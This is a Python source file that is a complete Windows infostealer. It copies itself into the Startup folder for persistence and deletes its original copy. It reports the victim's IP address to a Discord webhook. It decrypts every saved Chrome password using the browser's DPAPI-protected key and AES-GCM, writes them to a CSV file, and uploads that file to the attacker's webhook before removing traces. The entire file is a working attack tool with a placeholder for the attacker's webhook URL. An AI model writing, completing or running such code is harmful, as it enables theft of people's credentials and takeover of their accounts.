import os
from discord_webhook import DiscordWebhook
import requests
import shutil
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

webhook_url = ""    # NOTE: IMPORT YOUR WEBHOOK HERE
webhook = ""
CUR_DIR = os.getcwd()

def rmStuff(dir, text):
    with open(dir, "r") as file:
        content = file.read()
    with open(dir, "w") as file:
        file.write(content.replace(text, ""))

def startupCheck():
    STARTUP = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    os.chdir(STARTUP)
    if __file__ not in os.listdir(): 
        shutil.copy2(__file__, STARTUP)
        rmStuff(os.path.basename(__file__), '        rm()')
        rmStuff(os.path.basename(__file__), '        yoinkChromePassword()')
    os.chdir(CUR_DIR)

def rm():
    os.remove(__file__)

def checkDiscordWebhookLegit():
    global webhook
    try:
        webhook = DiscordWebhook(url=webhook, content=f"Connection from: {requests.get('https://api.ipify.org').text}")
        webhook.execute()
    except:
        pass

def yoinkChromePassword():
    #Full Credits to LimerBoy
    #GLOBAL CONSTANT
    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

    def get_secret_key():
        try:
            #(1) Get secretkey from chrome local state
            with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            #Remove suffix DPAPI
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            return None
        
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            #(3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            #Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            #(4) Build the cipher to decrypt the ciphertext
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()  
            return decrypted_pass
        except Exception as e:
            return ""
        
    def get_db_connection(chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            return None
            

    try:
        #Create Dataframe to store passwords
        with open(f"{os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp')}\\decrypted_password.csv", mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            #(1) Get secret key
            secret_key = get_secret_key()
            #Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                #(2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
                            #(4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            #(5) Save into CSV 
                            csv_writer.writerow([index,url,username,decrypted_password])
                    #Close database connection
                    cursor.close()
                    conn.close()
                    #Delete temp login db
                    os.remove("Loginvault.db")
    except Exception as e:
        pass


class Main:
    def __init__(self):
        startupCheck()
        rm()
        checkDiscordWebhookLegit()

        # Grabbing ip detail
        ip = requests.get('https://api.ipify.org').text
        text = os.popen(f"curl https://ipinfo.io/{ip}?token=dd2ff48ee55da5").read()
        webhook =  DiscordWebhook(url=webhook_url, content=text)
        webhook.execute()

        # Grabbing files
        yoinkChromePassword()

        webhook =  DiscordWebhook(url=webhook_url)
        with open(f"{os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp')}\\decrypted_password.csv", "rb") as f:
            webhook.add_file(file=f.read(), filename="Chrome_password.csv")
        webhook.execute()
        os.remove(f"{os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp')}\\decrypted_password.csv")


if __name__ == "__main__":
    Main()
